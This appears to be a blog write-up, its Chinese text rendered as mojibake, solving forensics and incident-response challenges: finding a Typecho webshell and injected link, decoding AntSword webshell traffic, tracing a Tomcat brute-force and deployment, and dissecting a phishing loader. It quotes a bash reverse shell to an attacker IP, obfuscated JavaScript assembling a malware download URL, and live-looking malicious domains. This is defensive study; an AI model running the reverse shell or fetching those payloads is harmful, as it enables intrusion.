<h2 id="linuxå®æˆ˜-é»‘é“¾"><a href="#linuxå®æˆ˜-é»‘é“¾" class="headerlink" title="linuxå®æˆ˜-é»‘é“¾"></a>linuxå®æˆ˜-é»‘é“¾</h2><h4 id="ä»»åŠ¡ä¸€-14"><a href="#ä»»åŠ¡ä¸€-14" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰¾åˆ°é»‘é“¾æ·»åŠ åœ¨å“ªä¸ªæ–‡ä»¶ flag æ ¼å¼ flag&#123;xxx.xxx&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨æ–‡æœ¬æœç´¢å…³é”®å­—â€œé»‘é“¾â€å¾ˆå¿«å°±èƒ½æ‰¾åˆ°</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/f63bafc48539d221ae1355b4a9f67525--b75a--image-20240612155110934.png" alt="image-20240612155110934"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;header.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-13"><a href="#ä»»åŠ¡äºŒ-13" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshellçš„ç»å¯¹è·¯å¾„ flag&#123;xxxx/xxx/xxx/xxx/&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯ä½¿ç”¨Dç›¾å»æ‰«æä¸€ä¸‹å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/e959989a679f44300ac08580e0652413--2919--image-20240612155247623.png" alt="image-20240612155247623"></p>
<p>åé—¨ä¹Ÿå°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\var\www\html\usr\themes\default\404.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/var/www/html/usr/themes/default/404.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-13"><a href="#ä»»åŠ¡ä¸‰-13" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢æ³¨å…¥é»‘é“¾æ–‡ä»¶çš„ md5 md5sum file flag&#123;md5&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯ä½¿ç”¨md5sumå³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/3f127ad880c5d32a643ebd005b0e4562--5307--image-20240612155646368.png" alt="image-20240612155646368"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10c18029294fdec7b6ddab76d9367c14</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;10c18029294fdec7b6ddab76d9367c14&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-13"><a href="#ä»»åŠ¡å››-13" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»å…¥å£æ˜¯å“ªé‡Œï¼Ÿurlè¯·æ±‚è·¯å¾„ï¼Œæœ€åé¢åŠ / flag&#123;/xxxx.xxx/xxxx/x/&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„è¯æˆ‘ä»¬å°±å¯ä»¥å°è¯•å»å¯¹æ•°æ®åŒ…è¿›è¡Œæµé‡åˆ†æ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/98da58ad87d433f4bed428f02d18bffc--e0eb--image-20240612160018499.png" alt="image-20240612160018499"></p>
<p>å‘ç°è¿™é‡Œå»åŠ è½½poc1.js</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/622a232085200d6f927500fc7e56582b--4b2a--image-20240612160057491.png" alt="image-20240612160057491"></p>
<p>æˆ‘ä»¬èƒ½å¤Ÿå¾ˆå®¹æ˜“å‘ç°æ˜¯xssæ¼æ´ï¼ŒæŸ¥æ‰¾ä¸€ç•ªå‘ç°æ˜¯typechoçš„å¯¹åº”æ¼æ´</p>
<p><a href="https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html">Typecho1.2 - 1.2.1-rcå‰å°è¯„è®ºå­˜å‚¨xssåˆ°rce æ¼æ´å¤ç°-åˆ†æ-ä¿®å¤ - JunBlog</a></p>
<p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿå°±çŸ¥é“äº†å¯¹åº”çš„è·¯å¾„äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-12/7e1969627573a3ee0e64f7855dd279fb--3cf6--image-20240612160242078.png" alt="image-20240612160242078"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/index.php/archives/1/&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬å…­ç« -æµé‡ç‰¹å¾åˆ†æ"><a href="#ç¬¬å…­ç« -æµé‡ç‰¹å¾åˆ†æ" class="headerlink" title="ç¬¬å…­ç«  æµé‡ç‰¹å¾åˆ†æ"></a>ç¬¬å…­ç«  æµé‡ç‰¹å¾åˆ†æ</h1><h2 id="èšå‰‘æµé‡åˆ†æ"><a href="#èšå‰‘æµé‡åˆ†æ" class="headerlink" title="èšå‰‘æµé‡åˆ†æ"></a>èšå‰‘æµé‡åˆ†æ</h2><h4 id="ä»»åŠ¡ä¸€-15"><a href="#ä»»åŠ¡ä¸€-15" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.æœ¨é©¬çš„è¿æ¥å¯†ç æ˜¯å¤šå°‘</span><br></pre></td></tr></table></figure>

<p>å‘ç°é™„ä»¶æ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨Wiresharkå»åˆ†æå³å¯</p>
<p>é¦–å…ˆå°±æ˜¯æ‰¾è¿æ¥å¯†ç ï¼Œè¿™ä¸ªè‚¯å®šå°±æ˜¯httpè¯·æ±‚çš„ç›¸å…³</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;200&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/fa686be7307f55519c405bd10a532143--9b22--image-20240614160321164.png" alt="image-20240614160321164"></p>
<p>ç›´æ¥å°±æ˜¯èƒ½å¤Ÿå‘ç°æ˜¯èšå‰‘çš„æµé‡</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/b5f9123c512a6a573269586b13b65aab--af17--image-20240614162932648.png" alt="image-20240614162932648"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-14"><a href="#ä»»åŠ¡äºŒ-14" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.é»‘å®¢æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯ä»€ä¹ˆ</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/d0fa5b080c7d387b50f8f1987d6904d8--c9d0--image-20240614171146710.png" alt="image-20240614171146710"></p>
<p>ç‚¹å‡»æ˜¾ç¤ºåˆ†ç»„å­—èŠ‚</p>
<p>ç„¶åä½¿ç”¨base64è§£å¯†å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/bd5edf7004743dae03c953373eaf7618--0673--image-20240614171048945.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;id&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-14"><a href="#ä»»åŠ¡ä¸‰-14" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.é»‘å®¢è¯»å–äº†å“ªä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæäº¤æ–‡ä»¶ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/25b1bc643eaafd747fe9edb9a26a4378--668a--image-20240614173147960.png" alt="image-20240614173147960"></p>
<p>ç¬¬ä¸‰ä¸ªhttpè¯·æ±‚åŒ…ä¸­å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-14"><a href="#ä»»åŠ¡å››-14" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ä¸Šä¼ äº†ä»€ä¹ˆæ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œæäº¤æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<p>ç¬¬å››ä¸ªè¯·æ±‚åŒ…</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/69277f04d9978a2b5dd7fface608598b--6f62--image-20240614175654256.png" alt="image-20240614175654256"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;flag.txt&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-9"><a href="#ä»»åŠ¡äº”-9" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹æ˜¯ä»€ä¹ˆ</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±è¿˜æ˜¯ç¬¬å››ä¸ªhttpåŒ…ï¼Œè·Ÿè¸ªä¸€ä¸‹httpæµå³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/a3a668d939eef0e96b6cf73002e8e1d0--b87c--image-20240614180642326.png" alt="image-20240614180642326"></p>
<p>å°†æ•°æ®åŒ…è§£ç ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/24a4490ab1b9890dacb25da9cfd51b6a--23e4--image-20240614180835252.png" alt="image-20240614180835252"></p>
<p>çŒœæµ‹è¿™ä¸€ä¸²å°±æ˜¯æ•°æ®</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/a6771054d8a59c8b5659e0a824e0c39c--05e3--image-20240614180853189.png" alt="image-20240614180853189"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;write_flag&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å…­-2"><a href="#ä»»åŠ¡å…­-2" class="headerlink" title="ä»»åŠ¡å…­"></a>ä»»åŠ¡å…­</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ä¸‹è½½äº†å“ªä¸ªæ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€ä¸ªhttpè¯·æ±‚åŒ…ä¸­å¯ä»¥æ‰¾åˆ°</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/45047d9be713a07b3417c15a8e1e1c68--5a71--image-20240614181441944.png" alt="image-20240614181441944"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/var/www/html/config.php&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜å®Œå…¨å°±æ˜¯httpæµé‡åˆ†æ</p>
<h2 id="å¸¸è§æ”»å‡»äº‹ä»¶-tomcat"><a href="#å¸¸è§æ”»å‡»äº‹ä»¶-tomcat" class="headerlink" title="å¸¸è§æ”»å‡»äº‹ä»¶ tomcat"></a>å¸¸è§æ”»å‡»äº‹ä»¶ tomcat</h2><h4 id="ä»»åŠ¡ä¸€-16"><a href="#ä»»åŠ¡ä¸€-16" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨webæœåŠ¡å™¨ä¸Šå‘ç°çš„å¯ç–‘æ´»åŠ¨,æµé‡åˆ†æä¼šæ˜¾ç¤ºå¾ˆå¤šè¯·æ±‚,è¿™è¡¨æ˜å­˜åœ¨æ¶æ„çš„æ‰«æè¡Œä¸º,é€šè¿‡åˆ†ææ‰«æçš„è¡Œä¸ºåæäº¤æ”»å‡»è€…IP flagæ ¼å¼ï¼šflag&#123;ip&#125;ï¼Œå¦‚ï¼šflag&#123;127.0.0.1&#125;</span><br></pre></td></tr></table></figure>

<p>èƒ½å¤Ÿå‘ç°å¤§é‡çš„SYNçš„åŒ…ï¼Œnmapçš„æ‰«æå°±æ˜¯SYNï¼Œæ‰€ä»¥ä¹Ÿå°±èƒ½å¤Ÿå¾—åˆ°ip</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/d0d6a6f1c647d455e00ab6632a68a43d--c187--image-20240614235450104.png" alt="image-20240614235450104"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;14.0.0.120&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-15"><a href="#ä»»åŠ¡äºŒ-15" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰¾åˆ°æ”»å‡»è€…IPåè¯·é€šè¿‡æŠ€æœ¯æ‰‹æ®µç¡®å®šå…¶æ‰€åœ¨åœ°å€ flagæ ¼å¼: flag&#123;åŸå¸‚è‹±æ–‡å°å†™&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯ä¿¡æ¯æ”¶é›†çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ç›´æ¥æŸ¥ipé¦–å…ˆå°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;guangzhou&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/59428c6cec380c850951c89ebe2cf20d--37e6--image-20240615000628313.png" alt="image-20240615000628313"></p>
<h4 id="ä»»åŠ¡ä¸‰-15"><a href="#ä»»åŠ¡ä¸‰-15" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å“ªä¸€ä¸ªç«¯å£æä¾›å¯¹webæœåŠ¡å™¨ç®¡ç†é¢æ¿çš„è®¿é—®ï¼Ÿ flagæ ¼å¼ï¼šflag&#123;2222&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯è¿‡æ»¤å‡ºæ¥httpçš„</p>
<p>éšä¾¿è¿½è¸ªä¸€ä¸ªhttpæµï¼Œå°±çŸ¥é“å¯¹åº”çš„ç«¯å£äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/d4ce1f4a80d1e368e18c404949b41db6--473c--image-20240615000805842.png" alt="image-20240615000805842"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;8080&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-15"><a href="#ä»»åŠ¡å››-15" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç»è¿‡å‰é¢å¯¹æ”»å‡»è€…è¡Œä¸ºçš„åˆ†æå,æ”»å‡»è€…è¿ç”¨çš„å·¥å…·æ˜¯ï¼Ÿ flagæ ¼å¼ï¼šflag&#123;åç§°&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±å¯ä»¥é€šè¿‡å»åˆ†æUAå¤´å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/88feeb1ce33b8c1e1cb1a9b2ab2e4812--71d3--image-20240615000941609.png" alt="image-20240615000941609"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;gobuster&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-10"><a href="#ä»»åŠ¡äº”-10" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…æ‹¿åˆ°ç‰¹å®šç›®å½•çš„çº¿ç´¢å,æƒ³è¦é€šè¿‡æš´åŠ›ç ´è§£çš„æ–¹å¼ç™»å½•,è¯·é€šè¿‡åˆ†ææµé‡æ‰¾åˆ°æ”»å‡»è€…ç™»å½•æˆåŠŸçš„ç”¨æˆ·åå’Œå¯†ç ï¼Ÿ flagæ ¼å¼ï¼šflag&#123;root-123&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€èˆ¬ç™»å½•è¯·æ±‚éƒ½æ˜¯é‡‡ç”¨postè¯·æ±‚ï¼Œæˆ‘ä»¬å°±æ‰¾postæ–¹æ³•å³å¯</p>
<p>å¾ˆå®¹æ˜“å°±èƒ½æ‰¾åˆ°</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/aecf689150a1d113a363756aff218257--472c--image-20240615002118674.png" alt="image-20240615002118674"></p>
<p>å‘ç°æƒé™éªŒè¯ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯base64ç¼–ç ï¼Œæˆ‘ä»¬è§£ç ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/af2583d56bbbb4457f15019969dfef97--9358--image-20240615002155451.png" alt="image-20240615002155451"></p>
<p>æˆåŠŸè·å¾—è´¦å·å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;admin-tomcat&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å…­-3"><a href="#ä»»åŠ¡å…­-3" class="headerlink" title="ä»»åŠ¡å…­"></a>ä»»åŠ¡å…­</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…ç™»å½•æˆåŠŸå,å…ˆè¦å»ºç«‹åå¼¹shell,è¯·åˆ†ææµé‡æäº¤æ¶æ„æ–‡ä»¶çš„åç§°ï¼Ÿ flagæ ¼å¼ï¼šflag&#123;114514.txt&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯å°±æ˜¯åœ¨ä¸Šé¢çš„poståŒ…é‡Œé¢ï¼Œç›´æ¥å°±æ˜¯æœ‰çš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/8cf7bae73b246dcad4f740d032c924eb--c6df--image-20240615002713403.png" alt="image-20240615002713403"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;JXQOZY.war&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸ƒ-1"><a href="#ä»»åŠ¡ä¸ƒ-1" class="headerlink" title="ä»»åŠ¡ä¸ƒ"></a>ä»»åŠ¡ä¸ƒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…æƒ³è¦ç»´æŒææƒæˆåŠŸåçš„ç™»å½•,è¯·åˆ†ææµé‡åæäº¤å…³é”®çš„ä¿¡æ¯ï¼Ÿ flagæç¤º,æŸç§ä»»åŠ¡é‡Œçš„ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è·Ÿè¸ªæµ9461èƒ½å¤Ÿå‘ç°ä¸€ä¸ªåå¼¹shellçš„æƒé™ç»´æŒ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/5df4a904db283d640a2e57fbbb28c7c2--7c87--image-20240615003527468.png" alt="image-20240615003527468"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/14.0.0.120/443 0&gt;&amp;1&#x27;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å°ç‹å…¬å¸æ”¶åˆ°çš„é’“é±¼é‚®ä»¶"><a href="#å°ç‹å…¬å¸æ”¶åˆ°çš„é’“é±¼é‚®ä»¶" class="headerlink" title="å°ç‹å…¬å¸æ”¶åˆ°çš„é’“é±¼é‚®ä»¶"></a>å°ç‹å…¬å¸æ”¶åˆ°çš„é’“é±¼é‚®ä»¶</h2><h4 id="ä»»åŠ¡ä¸€-17"><a href="#ä»»åŠ¡ä¸€-17" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸‹è½½æ•°æ®åŒ…æ–‡ä»¶ hacker1.pacapngï¼Œåˆ†ææ¶æ„ç¨‹åºè®¿é—®äº†å†…åµŒ URL è·å–äº† zip å‹ç¼©åŒ…ï¼Œè¯¥ URL æ˜¯ä»€ä¹ˆå°†è¯¥ URLä½œä¸º FLAG æäº¤ FLAGï¼ˆå½¢å¼ï¼šflag&#123;xxxx.co.xxxx/w0ks//?YO=xxxxxxx&#125;ï¼‰ (æ— éœ€ httpã€https)ï¼›</span><br></pre></td></tr></table></figure>

<p>å¾ˆå®¹æ˜“å°±èƒ½å¤Ÿå‘ç°çš„è¿™ä¸ªï¼Œç›´æ¥å°±æ˜¯è¿‡æ»¤å‡ºæ¥httpåŒ…å°±æœ‰äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/8ee01b0d7ccc3cf93608a798f08353c2--1f0d--image-20240615200459366.png" alt="image-20240615200459366"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;tsdandassociates.co.sz/w0ks//?YO=1702920835&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-16"><a href="#ä»»åŠ¡äºŒ-16" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸‹è½½æ•°æ®åŒ…æ–‡ä»¶ hacker1.pacapngï¼Œåˆ†æè·å–åˆ°çš„ zip å‹ç¼©åŒ…çš„ MD5 æ˜¯ä»€ä¹ˆ ä½œä¸º FLAG æäº¤ FLAGï¼ˆå½¢å¼ï¼šflag&#123;md5&#125;ï¼‰ï¼›</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯åœ¨è¿”å›åŒ…ä¸­å§å‹ç¼©åŒ…ä¸‹è½½ä¸‹æ¥æ”¹ä¸‹åç¼€</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/e2237acfb411fa4e92414ad6f470ce49--20c5--image-20240615201106892.png" alt="image-20240615201106892"></p>
<p>ç„¶åå»è®¡ç®—ä¸€ä¸‹md5å€¼å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;F17DC5B1C30C512137E62993D1DF9B2F&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-16"><a href="#ä»»åŠ¡ä¸‰-16" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸‹è½½æ•°æ®åŒ…æ–‡ä»¶ hacker1.pacapngï¼Œåˆ†æ zip å‹ç¼©åŒ…é€šè¿‡åŠ è½½å…¶ä¸­çš„ javascript æ–‡ä»¶åˆ°å¦ä¸€ä¸ªåŸŸåä¸‹è½½åç»­æ¶æ„ç¨‹åºï¼Œ è¯¥åŸŸåæ˜¯ä»€ä¹ˆ?æäº¤ç­”æ¡ˆ:flag&#123;åŸŸå&#125;(æ— éœ€ httpã€https)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/5aa6de01d72e7033377a68f72a1854b7--e7ec--image-20240615201237513.png" alt="image-20240615201237513"></p>
<p>å¾ˆæ˜æ˜¾çš„å°±æ˜¯èƒ½å¤Ÿçœ‹åˆ°æœ‰å„ç§å­—ç¬¦ï¼Œæ„Ÿè§‰åº”è¯¥å°±æ˜¯æ‹¼æ¥</p>
<p>å…¶ä¸­ä¸€æ®µå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o457607380 = &#x27;&#x27;;</span><br><span class="line">o457607380+=&#x27;h&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;p&#x27;;</span><br><span class="line">o457607380+=&#x27;s&#x27;;</span><br><span class="line">o457607380+=&#x27;:&#x27;;</span><br><span class="line">o457607380+=&#x27;/&#x27;;</span><br><span class="line">o457607380+=&#x27;/&#x27;;</span><br><span class="line">o457607380+=&#x27;s&#x27;;</span><br><span class="line">o457607380+=&#x27;h&#x27;;</span><br><span class="line">o457607380+=&#x27;a&#x27;;</span><br><span class="line">o457607380+=&#x27;k&#x27;;</span><br><span class="line">o457607380+=&#x27;y&#x27;;</span><br><span class="line">o457607380+=&#x27;a&#x27;;</span><br><span class="line">o457607380+=&#x27;s&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;a&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;u&#x27;;</span><br><span class="line">o457607380+=&#x27;e&#x27;;</span><br><span class="line">o457607380+=&#x27;s&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;r&#x27;;</span><br><span class="line">o457607380+=&#x27;a&#x27;;</span><br><span class="line">o457607380+=&#x27;d&#x27;;</span><br><span class="line">o457607380+=&#x27;e&#x27;;</span><br><span class="line">o457607380+=&#x27;.&#x27;;</span><br><span class="line">o457607380+=&#x27;c&#x27;;</span><br><span class="line">o457607380+=&#x27;o&#x27;;</span><br><span class="line">o457607380+=&#x27;m&#x27;;</span><br><span class="line">o457607380+=&#x27;/&#x27;;</span><br><span class="line">o457607380+=&#x27;A&#x27;;</span><br><span class="line">o457607380+=&#x27;6&#x27;;</span><br><span class="line">o457607380+=&#x27;F&#x27;;</span><br><span class="line">o457607380+=&#x27;/&#x27;;</span><br><span class="line">o457607380+=&#x27;6&#x27;;</span><br><span class="line">o457607380+=&#x27;1&#x27;;</span><br><span class="line">o457607380+=&#x27;6&#x27;;</span><br><span class="line">o457607380+=&#x27;2&#x27;;</span><br><span class="line">o457607380+=&#x27;3&#x27;;</span><br><span class="line">o457607380+=&#x27;1&#x27;;</span><br><span class="line">o457607380+=&#x27;6&#x27;;</span><br><span class="line">o457607380+=&#x27;0&#x27;;</span><br><span class="line">o457607380+=&#x27;3&#x27;;</span><br><span class="line">l988241708 = &#x27;&#x27;;</span><br><span class="line">l988241708+=&#x27;q&#x27;;</span><br><span class="line">l988241708+=&#x27;u&#x27;;</span><br><span class="line">l988241708+=&#x27;i&#x27;;</span><br><span class="line">l988241708+=&#x27;.&#x27;;</span><br><span class="line">l988241708+=&#x27;q&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shakyastatuestrade.com/A6F/616231603</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;shakyastatuestrade.com&#125;</span><br></pre></td></tr></table></figure>

<h2 id="waf-ä¸Šçš„æˆªè·çš„é»‘å®¢æ”»å‡»æµé‡"><a href="#waf-ä¸Šçš„æˆªè·çš„é»‘å®¢æ”»å‡»æµé‡" class="headerlink" title="waf ä¸Šçš„æˆªè·çš„é»‘å®¢æ”»å‡»æµé‡"></a>waf ä¸Šçš„æˆªè·çš„é»‘å®¢æ”»å‡»æµé‡</h2><h4 id="ä»»åŠ¡ä¸€-18"><a href="#ä»»åŠ¡ä¸€-18" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿçš„å¯†ç  flag&#123;xxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>

